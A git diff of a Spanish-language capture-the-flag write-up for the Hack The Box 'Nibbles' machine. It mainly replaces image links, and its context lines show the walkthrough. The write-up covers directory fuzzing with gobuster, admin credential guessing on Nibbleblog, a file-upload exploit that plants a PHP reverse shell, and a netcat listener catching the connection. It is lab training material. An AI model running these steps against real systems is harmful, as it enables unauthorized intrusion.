@@ -1,6 +1,7 @@
+![image](https://github.com/user-attachments/assets/6434948d-c5e4-4727-985d-d42c318608f8)
 
+![image](https://github.com/user-attachments/assets/793b38a6-43c5-4400-80eb-b013bc7fc68e)
 
-![[Pasted image 20250512190050.png]]
 
 
 **Publicado:** 12 de Mayo de 2025 
@@ -102,22 +103,27 @@ Nmap done: 1 IP address (1 host up) scanned in 8.41 seconds
 
 Enumerando el servicio web del puerto 80 de forma manual, no vemos gran cosa aparte de un mensaje de bienvenida, aunque revisando el código fuente de la página encontramos un comentario en el que se menciona un directorio llamado /nibbleblog
 
-![[Pasted image 20250512190522.png]]
-![[Pasted image 20250512190533.png]]
+![image](https://github.com/user-attachments/assets/d3e4dff8-6316-4759-b210-9dab85cb5342)
+
+![image](https://github.com/user-attachments/assets/363616a4-7795-40cf-9786-c33065655236)
+
 
 
 Al acceder a este recurso no vemos gran cosa, aunque buscando algo de información sobre Nibbleblog encontramos que es proyecto de código abierto basado en un CMS para crear blogs de forma sencilla. 
 
-![[Pasted image 20250512190814.png]]
+![image](https://github.com/user-attachments/assets/2f9ec093-4fe7-49cd-b318-db4bb7aac24e)
+
 
 Revisando el código fuente en github hay varios ficheros que nos pueden aportar información sobre la versión:
 https://github.com/dignajar/nibbleblog
-![[Pasted image 20250512191241.png]]
+![image](https://github.com/user-attachments/assets/b1a2b298-6742-4022-945d-5a18b4a65ef8)
+
 
 Gracias al fichero README enumeramos la versión(4.0.3)
 
 http://10.10.10.75/nibbleblog/README
-![[Pasted image 20250512191743.png]]
+![image](https://github.com/user-attachments/assets/db0d82d3-d388-4151-b7d1-277bc5e0ee84)
+
 
 
 #### 🕷️Fuzzing de directorios
@@ -128,7 +134,8 @@ Al realizar fuzzing de directorios usando la herramienta gobuster hallamos algun
 gobuster dir -u http://10.10.10.75/nibbleblog -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -b 403,404,502 -x .php, .txt, .xml -r 
 ```
 
-![[Pasted image 20250512194642.png]]
+![image](https://github.com/user-attachments/assets/efd82280-c72d-4006-9c6b-0e03bc71a271)
+
 
 En el directorio content encontramos un xml con un nombre de usuario `admin`
 http://10.10.10.75/nibbleblog/content/private/users.xml
@@ -154,11 +161,13 @@ A continuación accedemos a otro de los recursos encontrado gracias al fuzzing d
 
 http://10.10.10.75/nibbleblog/admin.php?controller=user&action=login
 
-![[Pasted image 20250512195039.png]]
+![image](https://github.com/user-attachments/assets/9b0dce79-0247-40cc-a4cc-274035c2d77c)
+
 
 Antes de iniciar un ataque de fuerza bruta, probamos el usuario `admin`obtenido en el paso anterior con contraseñas como nibblesblog, nibbleblog, nibbles y obtenemos éxito con esta última:
 
-![[Pasted image 20250512195142.png]]
+![image](https://github.com/user-attachments/assets/9731d6c7-4b12-46ca-b4e5-b735328767e7)
+
 ## 💻 Explotación
 
 Anteriormente enumeramos la versión de este CMS. Una simple búsqueda nos permite saber que vulnerable a Arbitrary FIle Upload
@@ -211,7 +220,8 @@ mv php-reverse-shell.php nibbles.php
 ```
 
 Después de cambiar la IP y el puerto por el de mi host local, subo la shell
-![[Pasted image 20250512200829.png]]
+![image](https://github.com/user-attachments/assets/ccbd9595-00c4-4c56-8cf7-75c3bef98779)
+
 
 
 A continuación inicio un listener en el puerto 1234:
@@ -223,7 +233,8 @@ nc -nlvp 1234
 Por último realizo la petición a la shell y obtengo la conexión reversa:
 
 http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php
-![[Pasted image 20250512200847.png]]
+![image](https://github.com/user-attachments/assets/b5529054-563e-4be0-b49b-8893c22b57ca)
+
 
 ### Mejora de la shell
 
